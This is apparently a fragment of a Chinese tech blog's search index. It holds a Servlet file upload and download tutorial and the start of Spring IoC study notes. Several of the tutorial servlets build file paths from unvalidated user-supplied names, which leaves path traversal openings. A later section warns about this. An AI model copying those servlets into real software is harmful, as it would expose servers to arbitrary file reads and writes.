&lt;/servlet-mapping&gt;&lt;/web-app&gt;\n\n以上流程图清晰地展示了Servlet的实现原理，包括生命周期、请求处理流程、容器架构、过滤器链等关键概念。使用图表可以更直观地理解Servlet的工作方式.\n","categories":["java"],"tags":["java","servlet","web"]},{"title":"Servlet文件上传与下载实现","url":"/2025/04/05/java/servlet/servlet%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/","content":"Servlet文件上传与下载实现文件上传和下载是Web应用中常见的功能需求。本文将详细介绍如何使用Servlet技术实现文件的上传与下载。\n1. 文件上传实现1.1 基于Commons FileUpload实现Apache Commons FileUpload是一个用于处理HTTP文件上传的简单易用的组件。\n添加依赖&lt;dependency&gt;    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;    &lt;version&gt;1.5&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;commons-io&lt;/groupId&gt;    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;    &lt;version&gt;2.13.0&lt;/version&gt;&lt;/dependency&gt;\n\n完整代码示例@WebServlet(&quot;/upload&quot;)public class FileUploadServlet extends HttpServlet &#123;    // 上传文件存储目录    private static final String UPLOAD_DIRECTORY = &quot;upload&quot;;    // 上传配置    private static final int MEMORY_THRESHOLD = 1024 * 1024 * 3;  // 3MB    private static final int MAX_FILE_SIZE = 1024 * 1024 * 40;    // 40MB    private static final int MAX_REQUEST_SIZE = 1024 * 1024 * 50; // 50MB    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response)             throws ServletException, IOException &#123;        // 检测是否为多媒体上传        if (!ServletFileUpload.isMultipartContent(request)) &#123;            // 如果不是则停止            PrintWriter writer = response.getWriter();            writer.println(&quot;错误：表单必须包含 enctype=multipart/form-data&quot;);            writer.flush();            return;        &#125;        // 配置上传参数        DiskFileItemFactory factory = new DiskFileItemFactory();        // 设置内存临界值 - 超过后将产生临时文件并存储于临时目录中        factory.setSizeThreshold(MEMORY_THRESHOLD);        // 设置临时存储目录        factory.setRepository(new File(System.getProperty(&quot;java.io.tmpdir&quot;)));                ServletFileUpload upload = new ServletFileUpload(factory);                // 设置最大文件上传值        upload.setFileSizeMax(MAX_FILE_SIZE);        // 设置最大请求值(包含文件和表单数据)        upload.setSizeMax(MAX_REQUEST_SIZE);        // 中文处理        upload.setHeaderEncoding(&quot;UTF-8&quot;);        // 构造临时路径来存储上传的文件        String uploadPath = getServletContext().getRealPath(&quot;./&quot;) + File.separator + UPLOAD_DIRECTORY;                // 如果目录不存在则创建        File uploadDir = new File(uploadPath);        if (!uploadDir.exists()) &#123;            uploadDir.mkdir();        &#125;                try &#123;            // 解析请求的内容提取文件数据            List&lt;FileItem&gt; formItems = upload.parseRequest(request);                        if (formItems != null &amp;&amp; formItems.size() &gt; 0) &#123;                // 迭代处理每个文件                for (FileItem item : formItems) &#123;                    // 处理不在表单中的字段                    if (!item.isFormField()) &#123;                        String fileName = new File(item.getName()).getName();                        String filePath = uploadPath + File.separator + fileName;                        File storeFile = new File(filePath);                                                // 在控制台输出文件的上传路径                        System.out.println(&quot;上传文件路径: &quot; + filePath);                                                // 保存文件到硬盘                        item.write(storeFile);                        request.setAttribute(&quot;message&quot;, &quot;文件上传成功!&quot;);                    &#125;                &#125;            &#125;        &#125; catch (Exception ex) &#123;            request.setAttribute(&quot;message&quot;, &quot;错误信息: &quot; + ex.getMessage());        &#125;                // 跳转到结果页面        getServletContext().getRequestDispatcher(&quot;/result.jsp&quot;).forward(request, response);    &#125;&#125;\n\n1.2 基于Servlet 3.0+ @MultipartConfig实现Servlet 3.0及以上版本提供了内置的文件上传支持，无需额外的库。\n@WebServlet(&quot;/upload&quot;)@MultipartConfig(        fileSizeThreshold = 1024 * 1024, // 1 MB        maxFileSize = 1024 * 1024 * 10,  // 10 MB        maxRequestSize = 1024 * 1024 * 15, // 15 MB        location = &quot;/tmp&quot;)public class UploadServlet extends HttpServlet &#123;    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;                response.setContentType(&quot;text/html;charset=UTF-8&quot;);        PrintWriter out = response.getWriter();                // 获取文件存储路径        String uploadPath = getServletContext().getRealPath(&quot;&quot;) + File.separator + &quot;uploads&quot;;        File uploadDir = new File(uploadPath);        if (!uploadDir.exists()) &#123;            uploadDir.mkdir();        &#125;                try &#123;            // 解析请求，获取所有上传的文件            Collection&lt;Part&gt; parts = request.getParts();                        for (Part part : parts) &#123;                // 获取请求头中的Content-Disposition字段                String header = part.getHeader(&quot;content-disposition&quot;);                // 从请求头中提取文件名                String fileName = extractFileName(header);                                // 排除非文件字段                if (fileName != null &amp;&amp; !fileName.isEmpty()) &#123;                    // 写入文件                    part.write(uploadPath + File.separator + fileName);                    out.println(&quot;&lt;h2&gt;文件 &quot; + fileName + &quot; 上传成功!&lt;/h2&gt;&quot;);                &#125;            &#125;        &#125; catch (Exception e) &#123;            out.println(&quot;&lt;h2&gt;文件上传失败: &quot; + e.getMessage() + &quot;&lt;/h2&gt;&quot;);        &#125;    &#125;        private String extractFileName(String header) &#123;        if (header == null) return null;        // 从content-disposition头中提取文件名        // 格式: form-data; name=&quot;file&quot;; filename=&quot;example.jpg&quot;        for (String token : header.split(&quot;;&quot;)) &#123;            if (token.trim().startsWith(&quot;filename&quot;)) &#123;                // 提取文件名并去除引号                String fileName = token.substring(token.indexOf(&#x27;=&#x27;) + 1).trim().replace(&quot;\\&quot;&quot;, &quot;&quot;);                // 如果是IE浏览器，获取真实的文件名                if (fileName.contains(&quot;\\\\&quot;)) &#123;                    fileName = fileName.substring(fileName.lastIndexOf(&quot;\\\\&quot;) + 1);                &#125;                return fileName;            &#125;        &#125;        return null;    &#125;&#125;\n\n1.3 前端表单示例&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;文件上传示例&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;文件上传示例&lt;/h2&gt;        &lt;form method=&quot;post&quot; action=&quot;upload&quot; enctype=&quot;multipart/form-data&quot;&gt;        选择文件: &lt;input type=&quot;file&quot; name=&quot;file&quot; multiple=&quot;multiple&quot; /&gt;        &lt;br&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; value=&quot;上传&quot; /&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n2. 文件下载实现2.1 基本下载实现@WebServlet(&quot;/download&quot;)public class DownloadServlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;                // 获取要下载的文件名        String fileName = request.getParameter(&quot;file&quot;);        if (fileName == null || fileName.isEmpty()) &#123;            response.sendError(HttpServletResponse.SC_BAD_REQUEST, &quot;文件名不能为空&quot;);            return;        &#125;                // 获取文件存储路径        String filePath = getServletContext().getRealPath(&quot;/WEB-INF/downloads/&quot;);        File file = new File(filePath + fileName);                // 检查文件是否存在        if (!file.exists() || file.isDirectory()) &#123;            response.sendError(HttpServletResponse.SC_NOT_FOUND, &quot;文件不存在&quot;);            return;        &#125;        // 设置响应头        response.setContentType(&quot;application/octet-stream&quot;);        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\\&quot;&quot; + fileName + &quot;\\&quot;&quot;);        response.setContentLengthLong(file.length());                // 输出文件内容        try (FileInputStream fis = new FileInputStream(file);             ServletOutputStream sos = response.getOutputStream()) &#123;                        byte[] buffer = new byte[4096];            int bytesRead;            while ((bytesRead = fis.read(buffer)) != -1) &#123;                sos.write(buffer, 0, bytesRead);            &#125;        &#125;    &#125;&#125;\n\n2.2 处理中文文件名@WebServlet(&quot;/download&quot;)public class DownloadServlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;                // 获取参数        String fileName = request.getParameter(&quot;file&quot;);                // 文件路径        String filePath = getServletContext().getRealPath(&quot;/WEB-INF/downloads/&quot;) + fileName;        File file = new File(filePath);                if (file.exists()) &#123;            // 处理中文文件名            String userAgent = request.getHeader(&quot;User-Agent&quot;);            String encodedFilename;                        // 根据不同浏览器进行不同的编码            if (userAgent.contains(&quot;MSIE&quot;) || userAgent.contains(&quot;Trident&quot;)) &#123;                // IE浏览器                encodedFilename = URLEncoder.encode(fileName, &quot;UTF-8&quot;);            &#125; else if (userAgent.contains(&quot;Firefox&quot;)) &#123;                // Firefox浏览器                encodedFilename = &quot;=?UTF-8?B?&quot; + new String(Base64.getEncoder().encode(fileName.getBytes(&quot;UTF-8&quot;))) + &quot;?=&quot;;            &#125; else &#123;                // Chrome、Safari等其他浏览器                encodedFilename = URLEncoder.encode(fileName, &quot;UTF-8&quot;).replaceAll(&quot;\\\\+&quot;, &quot;%20&quot;);            &#125;                        // 设置响应头            response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\\&quot;&quot; + encodedFilename + &quot;\\&quot;&quot;);            response.setContentType(&quot;application/octet-stream&quot;);            response.setContentLengthLong(file.length());                        // 输出文件            try (FileInputStream in = new FileInputStream(file);                 BufferedInputStream bis = new BufferedInputStream(in);                 ServletOutputStream out = response.getOutputStream()) &#123;                                byte[] buffer = new byte[4096];                int bytesRead;                while ((bytesRead = bis.read(buffer)) != -1) &#123;                    out.write(buffer, 0, bytesRead);                &#125;            &#125;        &#125; else &#123;            response.sendError(HttpServletResponse.SC_NOT_FOUND, &quot;文件不存在&quot;);        &#125;    &#125;&#125;\n\n2.3 大文件下载处理@WebServlet(&quot;/download-large&quot;)public class LargeFileDownloadServlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;                String fileName = request.getParameter(&quot;file&quot;);        String filePath = getServletContext().getRealPath(&quot;/WEB-INF/downloads/&quot;) + fileName;        File file = new File(filePath);                if (!file.exists()) &#123;            response.sendError(HttpServletResponse.SC_NOT_FOUND, &quot;文件不存在&quot;);            return;        &#125;                // 获取Range头，支持断点续传        String range = request.getHeader(&quot;Range&quot;);        long start = 0;        long end = file.length() - 1;        boolean isPartialContent = false;                if (range != null &amp;&amp; range.startsWith(&quot;bytes=&quot;)) &#123;            isPartialContent = true;            String[] ranges = range.substring(&quot;bytes=&quot;.length()).split(&quot;-&quot;);            start = Long.parseLong(ranges[0]);                        if (ranges.length &gt; 1 &amp;&amp; !ranges[1].isEmpty()) &#123;                end = Long.parseLong(ranges[1]);            &#125;        &#125;                // 计算实际需要传输的数据长度        long contentLength = end - start + 1;                // 设置响应头        if (isPartialContent) &#123;            response.setStatus(HttpServletResponse.SC_PARTIAL_CONTENT); // 206            response.setHeader(&quot;Content-Range&quot;, &quot;bytes &quot; + start + &quot;-&quot; + end + &quot;/&quot; + file.length());        &#125; else &#123;            response.setStatus(HttpServletResponse.SC_OK); // 200        &#125;                response.setContentType(&quot;application/octet-stream&quot;);        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=\\&quot;&quot; + fileName + &quot;\\&quot;&quot;);        response.setContentLengthLong(contentLength);                // 输出文件内容        try (RandomAccessFile raf = new RandomAccessFile(file, &quot;r&quot;);             ServletOutputStream out = response.getOutputStream()) &#123;                        byte[] buffer = new byte[4096];            raf.seek(start);                        // 计算剩余需要传输的字节数            long remaining = contentLength;            int len;                        while (remaining &gt; 0 &amp;&amp; (len = raf.read(buffer, 0, (int)Math.min(buffer.length, remaining))) != -1) &#123;                out.write(buffer, 0, len);                remaining -= len;            &#125;        &#125;    &#125;&#125;\n\n3. 文件上传下载的注意事项3.1 上传相关注意事项\n文件大小限制：设置合理的文件大小限制，防止服务器资源被耗尽。\n\n文件类型验证：验证上传文件的类型，避免恶意文件被上传。\n\n\n// 文件类型验证String contentType = part.getContentType();if (contentType != null &amp;&amp; !contentType.startsWith(&quot;image/&quot;)) &#123;    throw new ServletException(&quot;仅允许上传图片文件!&quot;);&#125;\n\n\n文件名安全处理：避免使用用户提供的原始文件名，可以使用UUID重命名文件。\n\n// 生成唯一文件名String originalFileName = new File(item.getName()).getName();String extension = originalFileName.substring(originalFileName.lastIndexOf(&quot;.&quot;));String newFileName = UUID.randomUUID().toString() + extension;\n\n\n防止目录遍历攻击：验证文件名，确保不包含路径分隔符。\n\n// 验证文件名if (fileName.contains(&quot;..&quot;) || fileName.contains(&quot;/&quot;) || fileName.contains(&quot;\\\\&quot;)) &#123;    throw new SecurityException(&quot;非法的文件名&quot;);&#125;\n\n3.2 下载相关注意事项\n文件路径安全：避免通过参数直接指定下载文件的路径，防止路径遍历漏洞。\n\n// 不安全的写法String insecurePath = request.getParameter(&quot;path&quot;);File file = new File(insecurePath); // 危险！可能导致任意文件读取// 安全的写法String fileName = request.getParameter(&quot;file&quot;);// 验证文件名是否合法if (fileName.contains(&quot;..&quot;) || fileName.contains(&quot;/&quot;) || fileName.contains(&quot;\\\\&quot;)) &#123;    throw new SecurityException(&quot;非法的文件名&quot;);&#125;String securePath = getServletContext().getRealPath(&quot;/WEB-INF/downloads/&quot;) + fileName;\n\n\n下载权限控制：确保用户有权限下载请求的文件。\n\n// 示例：检查用户权限HttpSession session = request.getSession();User user = (User) session.getAttribute(&quot;user&quot;);if (user == null || !hasDownloadPermission(user, fileName)) &#123;    response.sendError(HttpServletResponse.SC_FORBIDDEN, &quot;没有权限下载此文件&quot;);    return;&#125;\n\n\n文件类型检测：根据文件类型设置正确的Content-Type。\n\n// 根据文件扩展名设置Content-TypeString extension = fileName.substring(fileName.lastIndexOf(&quot;.&quot;) + 1).toLowerCase();String contentType = &quot;application/octet-stream&quot;; // 默认二进制流switch (extension) &#123;    case &quot;pdf&quot;:        contentType = &quot;application/pdf&quot;;        break;    case &quot;jpg&quot;:    case &quot;jpeg&quot;:        contentType = &quot;image/jpeg&quot;;        break;    case &quot;png&quot;:        contentType = &quot;image/png&quot;;        break;    // 其他文件类型...&#125;response.setContentType(contentType);\n\n4. 最佳实践4.1 使用进度条显示上传&#x2F;下载进度前端JavaScript代码示例：\n&lt;form id=&quot;uploadForm&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;fileInput&quot; /&gt;    &lt;button type=&quot;button&quot; onclick=&quot;uploadFile()&quot;&gt;上传&lt;/button&gt;    &lt;div class=&quot;progress&quot;&gt;        &lt;div class=&quot;progress-bar&quot; id=&quot;progressBar&quot; style=&quot;width: 0%;&quot;&gt;0%&lt;/div&gt;    &lt;/div&gt;&lt;/form&gt;&lt;script&gt;function uploadFile() &#123;    const file = document.getElementById(&#x27;fileInput&#x27;).files[0];    const formData = new FormData();    formData.append(&#x27;file&#x27;, file);        const xhr = new XMLHttpRequest();        // 监听上传进度    xhr.upload.addEventListener(&#x27;progress&#x27;, (event) =&gt; &#123;        if (event.lengthComputable) &#123;            const percentComplete = (event.loaded / event.total) * 100;            document.getElementById(&#x27;progressBar&#x27;).style.width = percentComplete + &#x27;%&#x27;;            document.getElementById(&#x27;progressBar&#x27;).textContent = percentComplete.toFixed(2) + &#x27;%&#x27;;        &#125;    &#125;);        xhr.open(&#x27;POST&#x27;, &#x27;upload&#x27;, true);    xhr.send(formData);&#125;&lt;/script&gt;\n\n4.2 使用多线程处理上传的文件@WebServlet(&quot;/upload-async&quot;)@MultipartConfigpublic class AsyncUploadServlet extends HttpServlet &#123;    private ExecutorService executorService = Executors.newFixedThreadPool(5);    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;                final Part filePart = request.getPart(&quot;file&quot;);        final String fileName = getFileName(filePart);        final String uploadPath = getServletContext().getRealPath(&quot;&quot;) + File.separator + &quot;uploads&quot;;                // 创建存储目录        File uploadDir = new File(uploadPath);        if (!uploadDir.exists()) &#123;            uploadDir.mkdir();        &#125;                // 异步处理文件        executorService.submit(() -&gt; &#123;            try &#123;                filePart.write(uploadPath + File.separator + fileName);                                // 这里可以进行额外的文件处理，如图片压缩、水印添加等                processFile(uploadPath + File.separator + fileName);                                System.out.println(&quot;文件 &quot; + fileName + &quot; 处理完成&quot;);            &#125; catch (Exception e) &#123;                e.printStackTrace();            &#125;        &#125;);                // 立即返回响应        response.setContentType(&quot;text/html;charset=UTF-8&quot;);        response.getWriter().println(&quot;文件上传中，请稍后...&quot;);    &#125;        private String getFileName(Part part) &#123;        String contentDisp = part.getHeader(&quot;content-disposition&quot;);        String[] tokens = contentDisp.split(&quot;;&quot;);        for (String token : tokens) &#123;            if (token.trim().startsWith(&quot;filename&quot;)) &#123;                return token.substring(token.indexOf(&#x27;=&#x27;) + 1).trim().replace(&quot;\\&quot;&quot;, &quot;&quot;);            &#125;        &#125;        return null;    &#125;        private void processFile(String filePath) &#123;        // 实现文件处理逻辑        // 例如：图片压缩、格式转换等    &#125;        @Override    public void destroy() &#123;        // 关闭线程池        executorService.shutdown();        super.destroy();    &#125;&#125;\n\n4.3 断点续传实现@WebServlet(&quot;/resume-upload&quot;)public class ResumeUploadServlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        // 返回断点续传上传页面        response.setContentType(&quot;text/html;charset=UTF-8&quot;);        PrintWriter out = response.getWriter();                out.println(&quot;&lt;!DOCTYPE html&gt;&quot;);        out.println(&quot;&lt;html&gt;&quot;);        out.println(&quot;&lt;head&gt;&quot;);        out.println(&quot;&lt;title&gt;断点续传示例&lt;/title&gt;&quot;);        out.println(&quot;&lt;script&gt;&quot;);        out.println(&quot;function uploadChunk(file, start, chunkSize) &#123;&quot;);        out.println(&quot;  let end = Math.min(start + chunkSize, file.size);&quot;);        out.println(&quot;  let chunk = file.slice(start, end);&quot;);        out.println(&quot;  let xhr = new XMLHttpRequest();&quot;);        out.println(&quot;  let formData = new FormData();&quot;);        out.println(&quot;  formData.append(&#x27;file&#x27;, chunk);&quot;);        out.println(&quot;  formData.append(&#x27;fileName&#x27;, file.name);&quot;);        out.println(&quot;  formData.append(&#x27;start&#x27;, start);&quot;);        out.println(&quot;  formData.append(&#x27;end&#x27;, end);&quot;);        out.println(&quot;  formData.append(&#x27;fileSize&#x27;, file.size);&quot;);        out.println(&quot;  xhr.open(&#x27;POST&#x27;, &#x27;resume-upload&#x27;, true);&quot;);        out.println(&quot;  xhr.onload = function() &#123;&quot;);        out.println(&quot;    if (xhr.status === 200) &#123;&quot;);        out.println(&quot;      if (end &lt; file.size) &#123;&quot;);        out.println(&quot;        uploadChunk(file, end, chunkSize);&quot;);        out.println(&quot;      &#125; else &#123;&quot;);        out.println(&quot;        alert(&#x27;上传完成&#x27;);&quot;);        out.println(&quot;      &#125;&quot;);        out.println(&quot;    &#125;&quot;);        out.println(&quot;  &#125;;&quot;);        out.println(&quot;  xhr.send(formData);&quot;);        out.println(&quot;&#125;&quot;);        out.println(&quot;function startUpload() &#123;&quot;);        out.println(&quot;  let file = document.getElementById(&#x27;fileInput&#x27;).files[0];&quot;);        out.println(&quot;  if (file) &#123;&quot;);        out.println(&quot;    // 每次上传1MB&quot;);        out.println(&quot;    uploadChunk(file, 0, 1024 * 1024);&quot;);        out.println(&quot;  &#125;&quot;);        out.println(&quot;&#125;&quot;);        out.println(&quot;&lt;/script&gt;&quot;);        out.println(&quot;&lt;/head&gt;&quot;);        out.println(&quot;&lt;body&gt;&quot;);        out.println(&quot;&lt;h2&gt;断点续传示例&lt;/h2&gt;&quot;);        out.println(&quot;&lt;input type=&#x27;file&#x27; id=&#x27;fileInput&#x27;&gt;&quot;);        out.println(&quot;&lt;button onclick=&#x27;startUpload()&#x27;&gt;开始上传&lt;/button&gt;&quot;);        out.println(&quot;&lt;/body&gt;&quot;);        out.println(&quot;&lt;/html&gt;&quot;);    &#125;    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        // 接收文件块        String fileName = request.getParameter(&quot;fileName&quot;);        long start = Long.parseLong(request.getParameter(&quot;start&quot;));        long end = Long.parseLong(request.getParameter(&quot;end&quot;));        long fileSize = Long.parseLong(request.getParameter(&quot;fileSize&quot;));                // 获取上传文件存储目录        String uploadPath = getServletContext().getRealPath(&quot;&quot;) + File.separator + &quot;uploads&quot;;        File uploadDir = new File(uploadPath);        if (!uploadDir.exists()) &#123;            uploadDir.mkdir();        &#125;                // 目标文件        File targetFile = new File(uploadPath, fileName);                // 使用RandomAccessFile实现断点续传        try (InputStream in = request.getInputStream();             RandomAccessFile raf = new RandomAccessFile(targetFile, &quot;rw&quot;)) &#123;                        // 定位到文件的写入位置            raf.seek(start);                        // 写入数据            byte[] buffer = new byte[4096];            int bytesRead;            while ((bytesRead = in.read(buffer)) != -1) &#123;                raf.write(buffer, 0, bytesRead);            &#125;                        response.setStatus(HttpServletResponse.SC_OK);        &#125;    &#125;&#125;\n","categories":["java"],"tags":["java","servlet","web","文件上传","文件下载"]},{"title":"狂神spring笔记","url":"/2025/04/26/java/sping/README/","content":"1.Spring\n1.1、简介\nSpring：春天—&gt; 给软件行业带来了春天\n\n2002年，Rod Jahnson首次推出了Spring框架雏形interface21框架。\n\n2004年3月24日，Spring框架以interface21框架为基础，经过重新设计，发布了1.0正式版。\n\n很难想象Rod Johnson的学历 , 他是悉尼大学的博士，然而他的专业不是计算机，而是音乐学。\n\nSpring理念 : 使现有技术更加实用 . 本身就是一个大杂烩 , 整合现有的框架技术\n\nSSH : Struct2 + Spring + Hibernate!\n\nSSM : SpringMvc + Spring + Mybatis!\n\n官网 : http://spring.io/ \n\n官方下载地址 : https://repo.spring.io/libs-release-local/org/springframework/spring/ \n\nGitHub : https://github.com/spring-projects \n\n\n&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;    &lt;version&gt;5.2.7.RELEASE&lt;/version&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-jdbc --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt;    &lt;version&gt;5.2.7.RELEASE&lt;/version&gt;&lt;/dependency&gt;\n\n\n\n1.2、优点\nSpring是一个开源免费的框架 , 容器 \nSpring是一个轻量级的框架 , 非侵入式的 .\n控制反转 IoC  , 面向切面 Aop\n对事物的支持 , 对框架的支持\n\n总结一句话：Spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器（框架）。\n1.3、组成\n\n核心容器：核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转（IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。\nSpring 上下文：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。Spring 上下文包括企业服务，例如 JNDI、EJB、电子邮件、国际化、校验和调度功能。\nSpring AOP：通过配置管理特性，Spring AOP 模块直接将面向切面的编程功能 , 集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理任何支持 AOP的对象。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖组件，就可以将声明性事务管理集成到应用程序中。\nSpring DAO：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。\nSpring ORM：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结构。\nSpring Web 模块：Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。所以，Spring 框架支持与 Jakarta Struts 的集成。Web 模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。\nSpring MVC 框架：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText 和 POI。\n\n1.4、拓展在Spring的官网有这个介绍：现代化的java开发！说白就是基于Spring的开发！\n\n\nSpring Boot\n一个快速开发的脚手架\n基于SpringBoot可以快速开发单个微服务\n约定大于配置！\n\n\nSpring Cloud\nSpring CLoud是基于SpringBoot实现的\n\n\n\n因为现在大所述公司都在使用SpringBoot进行快速开发，学习SpringBoot的前提，需要完全掌握Spring及SpringMVC！承上启下的作用\n弊端：发展太久了之后，违背了原来的理念！配置十分繁琐，人称：“配置地狱”！\n2、IOC理论推导2.1、IoC基础1.UserDao接口\n2.UserDaoImpl实现类\n3.UserService业务接口\n4.UserServiceImpl业务实现类\n在我们之前的业务中，用户的需求可能会影响我们原来的代码，我们需要更具用户的需求去修改源代码！如果程序代码量十分大，修改一次的成本代价十分昂贵！\n\n我们使用一个Set接口实现，已经发生了革命性的变化！\n private UserDao userDao;// 利用set进行动态实现值的注入public void setUserDao(UserDao userDao) &#123;    this.userDao = userDao;&#125;\n\n\n\n\n之前，程序是主动创建对象！控制权在程序员手上！\n使用了set注入之后，程序不再有主动性，而是变成了被动的接受对象！\n\n这种思想从本质上实现了问题，我们程序员不用再去管理对象的创建了。系统的耦合性大大降低，可以更加专注的在业务的实现上！这是IOC的原型！\n\n2.2、IOC本质控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。\n采用XML方式配置Bean的时候，Bean的定义信息是和实现分离的，而采用注解的方式可以把两者合为一体，Bean的定义信息直接以注解的形式定义在实现类中，从而达到了零配置的目的。\n控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。\n3、HelloSpring导入Jar包\n注 : spring 需要导入commons-logging进行日志记录 . 我们利用maven , 他会自动下载对应的依赖项 .\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework&lt;/groupId&gt;    &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;    &lt;version&gt;5.2.7.RELEASE&lt;/version&gt;&lt;/dependency&gt;\n\n编写代码\n1、编写一个Hello实体类\npublic class Hello &#123;    private String str;    public String getStr() &#123;        return str;    &#125;    public void setStr(String str) &#123;        this.str = str;    &#125;    @Override    public String toString() &#123;        return &quot;Hello&#123;&quot; +                &quot;str=&#x27;&quot; + str + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n2、编写我们的spring文件 , 这里我们命名为beans.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!--bean就是java对象 , 由Spring创建和管理    类型 变量名 = new 类型();    Hello hello = new Hello();    bean = 对象   new Hello();    id = 变量名    class = new的对象    property 相当于给对象中的属性设置一个变量    --&gt;    &lt;bean id=&quot;hello&quot; class=&quot;nuc.ss.pojo.Hello&quot;&gt;        &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n3、我们可以去进行测试了 .\npublic class MyTest &#123;    public static void main(String[] args) &#123;        // 获取Spring的上下文对象        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        //我们的对象现在都在Spring中管理了，我们要使用，直接去里面取出来就可以        Hello hello = (Hello)context.getBean(&quot;hello&quot;);        System.out.println(hello);    &#125;&#125;\n\n\n\n思考问题？\n\nHello 对象是谁创建的 ?  \nhello 对象是由Spring创建的\nHello 对象的属性是怎么设置的 ?  \nhello 对象的属性是由Spring容器设置的\n\n这个过程就叫控制反转 :\n\n控制 : 谁来控制对象的创建 , 传统应用程序的对象是由程序本身控制创建的 , 使用Spring后 , 对象是由Spring来创建的\n反转 : 程序本身不创建对象 , 而变成被动的接收对象 \n依赖注入 : 就是利用set方法来进行注入的.\n\n IOC是一种编程思想，由主动的编程变成被动的接收\n可以通过new ClassPathXmlApplicationContext去浏览一下底层源码 \n**OK , 到了现在 , 我们彻底不用再程序中去改动了 , 要实现不同的操作 , 只需要在xml配置文件中进行修改 , 所谓的IoC,一句话搞定 : 对象由Spring 来创建 , 管理 , 装配 ! **\n4、IOC创建对象的方式1.使用无参构造创建对象，默认！\n&lt;!--无参构造器--&gt;&lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot;&gt;    &lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;&lt;/bean&gt;\n\n2.假设我们要使用有参构造创建对象。\n\n下标赋值\n&lt;!--有参构造器1，下标赋值--&gt;&lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot;&gt;    &lt;constructor-arg index=&quot;0&quot; value=&quot;狂神说Java&quot;/&gt;&lt;/bean&gt;\n\n类型\n&lt;!--有参构造器2，类型，但同类型只能一个，不建议使用--&gt;&lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot;&gt;    &lt;constructor-arg type=&quot;java.lang.String&quot; 